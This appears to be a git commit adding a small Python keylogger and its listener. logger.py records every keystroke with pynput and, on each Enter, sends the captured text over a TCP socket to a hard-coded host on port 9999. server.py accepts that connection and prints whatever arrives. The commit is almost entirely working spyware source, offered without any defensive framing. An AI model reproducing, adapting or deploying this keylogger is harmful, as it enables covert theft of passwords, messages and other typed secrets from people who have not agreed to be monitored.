9e51850e20c9d9962344cc10f6fb9c3002cc6c4f
Itsahill <zrekker@gmail.com>
2025-07-21 15:41:53 -0400

    Add files via upload

---
+++ logger.py
@@ -0,0 +1,35 @@
+import os, socket
+
+from pynput.keyboard import Key, Listener
+
+#Create Socket and Connect
+host = "192.168.4.252"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,9999))
+
+
+log = "\n"
+
+def on_press(key):
+    global log
+    if key != Key.enter:
+        if (str(key)).__contains__("Key."):
+            if key == Key.space:
+                log += " "
+            else:
+                if len(log) > 1:
+                    log += "\n"
+                    log += str(key).strip("'")
+                else:
+                    log += str(key).strip("'")
+                    log += "\n"
+        else:
+            log += str(key).strip("'")
+    else:
+        s.sendall((log).encode('utf-8'))
+        log = "\n"
+
+with Listener(on_press=on_press) as listener :
+    listener.join()
+     
+        
---
+++ server.py
@@ -0,0 +1,18 @@
+import socket
+
+# Creating a socket
+host = "192.168.4.252"
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind((host, 9999))
+sock.listen(1)
+
+# Accepting the Client Connection
+print("Waiting for Client...")
+conn,addr = sock.accept()
+print("Connection from " + addr[0] + " Confirmed.")
+
+#Printing Data from Client
+while True:
+    data = conn.recv(1024)
+    if data:
+        print(data.decode('utf-8'))
